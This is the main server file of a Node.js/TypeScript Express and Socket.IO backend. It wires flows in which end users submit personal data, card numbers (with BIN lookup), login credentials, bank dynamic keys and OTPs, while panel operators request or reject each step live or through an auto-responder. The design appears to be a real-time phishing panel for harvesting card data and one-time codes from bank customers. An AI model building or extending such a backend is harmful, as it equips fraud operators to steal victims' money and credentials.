import "dotenv/config";
import express from "express";
import http from "http";
import cors from "cors";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import { Server } from "socket.io";

import { PrismaSessionRepository } from "./adapters/outbound/db/PrismaSessionRepository.js";
import { JwtTokenService } from "./adapters/outbound/auth/JwtTokenService.js";
import { SocketIoGateway } from "./adapters/outbound/realtime/SocketIoGateway.js";

import { buildSocketAuthMiddleware } from "./adapters/inbound/ws/socketAuthMiddleware.js";
import { registerUserHandlers } from "./adapters/inbound/ws/handlers/UserHandlers.js";
import { registerAdminHandlers } from "./adapters/inbound/ws/handlers/AdminHandlers.js";

import { CreateSession } from "./core/application/usecases/CreateSession.js";
import { IssueUserToken } from "./core/application/usecases/IssueUserToken.js";
import { IssueAdminToken } from "./core/application/usecases/IssueAdminToken.js";
import { UserSubmitAuth } from "./core/application/usecases/UserSubmitAuth.js";
import { UserSubmitDinamic } from "./core/application/usecases/UserSubmitDinamic.js";
import { UserSubmitOtp } from "./core/application/usecases/UserSubmitOtp.js";
import { AdminRequestDinamic } from "./core/application/usecases/AdminRequestDinamic.js";
import { AdminRequestOtp } from "./core/application/usecases/AdminRequestOtp.js";
import { AdminRejectAuth } from "./core/application/usecases/AdminRejectAuth.js";
import { AdminRejectDinamic } from "./core/application/usecases/AdminRejectDinamic.js";
import { AdminRejectOtp } from "./core/application/usecases/AdminRejectOtp.js";
import { AdminBootstrap } from "./core/application/usecases/AdminBootstrap.js";

import { SessionsController } from "./adapters/inbound/http/controllers/SessionsController.js";
import { AdminController } from "./adapters/inbound/http/controllers/AdminController.js";
import { buildRoutes } from "./adapters/inbound/http/routes.js";
import { GetSession } from "./core/application/usecases/GetSession.js";
import { UserGetSession } from "./core/application/usecases/UserGetSession.js";
import { UserSubmitData } from "./core/application/usecases/UserSubmitData.js";
import { AdminRequestData } from "./core/application/usecases/AdminRequestData.js";
import { AdminRejectData } from "./core/application/usecases/AdminRejectData.js";
import { AdminRequestAuth } from "./core/application/usecases/AdminRequestAuth.js";
import { registerPresenceHandlers } from "./adapters/inbound/ws/handlers/PresenceHandlers.js";
import { NodePresenceTimer } from "./adapters/outbound/timers/NodePresenceTimer.js";
import { MarkInactiveLater } from "./core/application/usecases/MarkInactiveLater.js";
import { SetPresence } from "./core/application/usecases/SetPresence.js";
import { AdminRequestFinish } from "./core/application/usecases/AdminRequestFinish.js";
import { AdminRequestCc } from "./core/application/usecases/AdminRequestCc.js";
import { AdminRejectCc } from "./core/application/usecases/AdminRejectCc.js";
import { UserSubmitCc } from "./core/application/usecases/UserSubmitCc.js";
import { PrismaBinLookupRepository } from "./adapters/outbound/db/PrismaBinLookupRepository.js";
import { ThirdPartyBinClient } from "./adapters/outbound/bin/ThirdPartyBinClient.js";
import { BinLookupService } from "./adapters/outbound/bin/BinLookupService.js";
import { prisma } from "./adapters/outbound/db/prismaClient.js";

// Panel User imports
import { PrismaPanelUserRepository } from "./adapters/outbound/db/PrismaPanelUserRepository.js";
import { PrismaOtpRepository } from "./adapters/outbound/db/PrismaOtpRepository.js";
import { TelegramBotService } from "./adapters/outbound/telegram/TelegramBotService.js";
import { SyncPanelUser } from "./core/application/usecases/panelUser/SyncPanelUser.js";
import { RequestOtp } from "./core/application/usecases/panelUser/RequestOtp.js";
import { VerifyOtp } from "./core/application/usecases/panelUser/VerifyOtp.js";
import { HandleTelegramUpdate } from "./core/application/usecases/panelUser/HandleTelegramUpdate.js";
import { PanelUserController } from "./adapters/inbound/http/controllers/PanelUserController.js";
import { TelegramController } from "./adapters/inbound/http/controllers/TelegramController.js";

// Project imports
import { PrismaProjectRepository } from "./adapters/outbound/db/PrismaProjectRepository.js";
import { SyncProject } from "./core/application/usecases/project/SyncProject.js";
import { SyncProjectMember } from "./core/application/usecases/project/SyncProjectMember.js";
import { ProjectController } from "./adapters/inbound/http/controllers/ProjectController.js";

// Auto-Responder imports
import { PrismaAutoResponderConfigRepository } from "./adapters/outbound/db/PrismaAutoResponderConfigRepository.js";
import { NodeAutoResponderTimer } from "./adapters/outbound/timers/NodeAutoResponderTimer.js";
import { AutoResponderOrchestrator } from "./core/application/usecases/autoResponder/AutoResponderOrchestrator.js";
import { AutoResponderController } from "./adapters/inbound/http/controllers/AutoResponderController.js";


const PORT = Number(process.env.PORT || 3005);
const PANEL = process.env.PANEL_HOST || "";
const LTM1 = process.env.LTM1_HOST || "";
const BC1 = process.env.BC1_HOST || "";
const ZENTRA = process.env.ZENTRA_HOST || "";
const ORIGINS = [PANEL, LTM1, BC1, ZENTRA];
const app = express();
app.use(express.json());
app.use(helmet());
app.set("trust proxy", 1);
// ✅ 2) Rate limit (global o por grupo de rutas)
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
});
app.use(limiter);

app.use(cors({ origin: ORIGINS, credentials: true }));

const httpServer = http.createServer(app);
const io = new Server(httpServer, {
  cors: { origin: ORIGINS, credentials: true },
});

// ---- Outbound adapters
const repo = new PrismaSessionRepository();
const tokens = new JwtTokenService(process.env.NODE_JWT_SECRET!);
const rt = new SocketIoGateway(io);


// ✅ BIN cache-first
const binRepo = new PrismaBinLookupRepository(prisma);
const binRemote = new ThirdPartyBinClient(process.env.BIN_API_KEY!, process.env.BIN_API_URL!);
const binLookupService = new BinLookupService(binRepo, binRemote);

// ---- Panel User adapters
const panelUserRepo = new PrismaPanelUserRepository();
const otpRepo = new PrismaOtpRepository();
const telegramBot = process.env.TELEGRAM_BOT_TOKEN
  ? new TelegramBotService(process.env.TELEGRAM_BOT_TOKEN)
  : null;

// ---- Project adapters
const projectRepo = new PrismaProjectRepository();

// ---- Use cases
const createSession = new CreateSession(repo, tokens, rt);
const getSession = new GetSession(repo);

const issueUserToken = new IssueUserToken(repo, tokens);
const issueAdminToken = new IssueAdminToken(
  tokens,
  process.env.LARAVEL_SHARED_SECRET || ""
);

/* admin */

const adminBootstrap = new AdminBootstrap(repo, projectRepo, rt);
const requestAuth = new AdminRequestAuth(repo, rt);
const rejectAuth = new AdminRejectAuth(repo, rt);
const requestCc = new AdminRequestCc(repo, rt);
const rejectCc = new AdminRejectCc(repo, rt);
const requestData = new AdminRequestData(repo, rt);
const rejectData = new AdminRejectData(repo, rt);
const requestDinamic = new AdminRequestDinamic(repo, rt);
const rejectDinamic = new AdminRejectDinamic(repo, rt);
const requestOtp = new AdminRequestOtp(repo, rt);
const rejectOtp = new AdminRejectOtp(repo, rt);
const requestFinish = new AdminRequestFinish(repo, rt);

/* user */

const submitData = new UserSubmitData(repo, rt);
const submitCc = new UserSubmitCc(repo, rt, binLookupService);
const submitAuth = new UserSubmitAuth(repo, rt);
const submitDinamic = new UserSubmitDinamic(repo, rt);
const submitOtp = new UserSubmitOtp(repo, rt);
const userGetSession = new UserGetSession(repo);

/* state handlers */
const setPresence = new SetPresence(repo, rt);
const presenceTimer = new NodePresenceTimer();
const markInactiveLater = new MarkInactiveLater(presenceTimer, setPresence);

/* auto-responder */
const arConfigRepo = new PrismaAutoResponderConfigRepository();
const arTimer = new NodeAutoResponderTimer();
const arActionMap: Record<string, { execute(input: { sessionId: string }): Promise<any> }> = {
  request_data: requestData,
  reject_data: rejectData,
  request_cc: requestCc,
  reject_cc: rejectCc,
  request_auth: requestAuth,
  reject_auth: rejectAuth,
  request_dinamic: requestDinamic,
  reject_dinamic: rejectDinamic,
  request_otp: requestOtp,
  reject_otp: rejectOtp,
  request_finish: requestFinish,
};
const arOrchestrator = new AutoResponderOrchestrator(arConfigRepo, arTimer, arActionMap, repo);

// Wire auto-responder hooks into gateway
rt.setOnUpsert((session) => arOrchestrator.onSessionChanged(session));
rt.setArDeadlineProvider((sessionId) => arOrchestrator.getDeadline(sessionId));

/* panel user */
const sharedSecret = process.env.LARAVEL_SHARED_SECRET || "";
const syncPanelUser = new SyncPanelUser(panelUserRepo, sharedSecret);
const panelRequestOtp = telegramBot
  ? new RequestOtp(panelUserRepo, otpRepo, telegramBot, sharedSecret, {
      otpLength: Number(process.env.OTP_LENGTH) || 6,
      otpExpirySeconds: Number(process.env.OTP_EXPIRY_SECONDS) || 300,
    })
  : null;
const panelVerifyOtp = new VerifyOtp(panelUserRepo, otpRepo, tokens, sharedSecret);
const handleTelegramUpdate = telegramBot
  ? new HandleTelegramUpdate(panelUserRepo, telegramBot)
  : null;

/* project */
const syncProject = new SyncProject(projectRepo, sharedSecret);
const syncProjectMember = new SyncProjectMember(projectRepo, panelUserRepo, rt, sharedSecret);

// ---- Controllers + routes
const sessionsController = new SessionsController(
  createSession,
  issueUserToken,
  getSession
);
const adminController = new AdminController(issueAdminToken);

// Panel User controllers (optional - only if Telegram is configured)
const panelUserController = panelRequestOtp
  ? new PanelUserController(syncPanelUser, panelRequestOtp, panelVerifyOtp, panelUserRepo, sharedSecret)
  : undefined;

const telegramController = handleTelegramUpdate
  ? new TelegramController(handleTelegramUpdate, process.env.TELEGRAM_WEBHOOK_SECRET)
  : undefined;

const projectController = new ProjectController(
  syncProject,
  syncProjectMember,
  projectRepo,
  sharedSecret
);

const autoResponderController = new AutoResponderController(arOrchestrator, rt, sharedSecret);

const routes = {
  sessions: sessionsController,
  admin: adminController,
  project: projectController,
  autoResponder: autoResponderController,
  ...(panelUserController ? { panelUser: panelUserController } : {}),
  ...(telegramController ? { telegram: telegramController } : {}),
} satisfies {
  sessions: SessionsController;
  admin: AdminController;
  project: ProjectController;
  autoResponder: AutoResponderController;
  panelUser?: PanelUserController;
  telegram?: TelegramController;
};

app.use(buildRoutes(routes));

// ---- Socket auth middleware
io.use(buildSocketAuthMiddleware(tokens));

// ---- WS wiring
io.on("connection", async (socket) => {
  const auth = socket.data.auth;

  if (auth.role === "admin") {
    console.log("[WS] Admin connected:", { panelUserId: auth.panelUserId, panelRole: auth.panelRole });

    // Registrar socket del panel user para mensajes directos
    rt.registerPanelUser(auth.panelUserId, socket.id);

    // Obtener datos del usuario para emitir presencia
    const panelUser = await panelUserRepo.findById(auth.panelUserId);
    if (panelUser) {
      rt.emitPanelUserOnline({
        odId: panelUser.id,
        username: panelUser.username,
        alias: panelUser.alias,
        role: panelUser.role,
        isOnline: true,
      });
    }

    // Unir a salas según rol
    if (auth.panelRole === "ADMIN") {
      socket.join("admins:all");  // Admin ve todas las sesiones
      console.log("[WS] Joined admins:all room");
    } else {
      // Usuario normal: unir a salas de sus proyectos aprobados
      const userProjects = await projectRepo.findProjectsByUser(auth.panelUserId, "APPROVED");
      console.log("[WS] User projects:", userProjects.map(p => p.projectId));
      for (const up of userProjects) {
        socket.join(`project:${up.projectId}`);
      }
    }

    // ✅ cada vez que un admin inicia sesión / conecta
    await adminBootstrap.execute({
      socketId: socket.id,
      panelUserId: auth.panelUserId,
      panelRole: auth.panelRole,
      limit: 200
    });

    // Enviar config de auto-responder al admin que se conecta
    const arConfig = arOrchestrator.getConfig();
    if (arConfig) {
      socket.emit("auto-responder:config", arConfig);
    }

    registerAdminHandlers(socket, {
      requestData,
      rejectData,
      requestAuth,
      rejectAuth,
      requestCc,
      rejectCc,
      requestDinamic,
      rejectDinamic,
      requestOtp,
      rejectOtp,
      requestFinish
    });

    // Manejar desconexión de admin
    socket.on("disconnect", () => {
      console.log("[WS] Admin disconnected:", { panelUserId: auth.panelUserId });
      rt.unregisterPanelUser(auth.panelUserId);
      rt.emitPanelUserOffline(auth.panelUserId);
    });
  }

  if (auth.role === "user") {
    const sessionId = auth.sessionId;
    socket.join(`session:${sessionId}`);
    registerPresenceHandlers(socket, {
      setPresence,
      markInactiveLater,
      inactiveDelayMs: 8000,
    });
    registerUserHandlers(socket, { userGetSession, submitData, submitCc, submitAuth, submitDinamic, submitOtp });
  }
});

// ---- Start server
httpServer.listen(PORT, "0.0.0.0", async () => {
  console.log(`Backend running on http://localhost:${PORT}`);

  // Load auto-responder config and start timers for existing WAIT sessions
  try {
    await arOrchestrator.loadConfig();
    await arOrchestrator.recheckAllSessions();
  } catch (e) {
    console.error("[AutoResponder] Startup error:", e);
  }
});
